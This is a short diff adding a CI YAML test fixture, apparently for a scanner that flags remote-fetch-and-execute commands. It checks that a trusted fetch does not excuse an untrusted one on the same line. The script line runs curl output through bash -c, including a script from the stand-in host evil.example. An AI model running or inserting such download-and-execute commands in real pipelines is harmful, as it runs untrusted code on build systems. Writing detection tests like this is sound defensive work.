@@ -1,0 +1,8 @@
+# violation: a line can carry more than one fetch-bearing substitution.
+# ALL of them must be trusted before the line is suppressed, so a
+# trusted fetch earlier on the line does not cover an untrusted one
+# later on the same line.
+install:
+  image: alpine:3.19
+  script:
+    - bash -c "$(curl -fsSL https://get.docker.com/a.sh)"; bash -c "$(curl -fsSL https://evil.example/b.sh)"
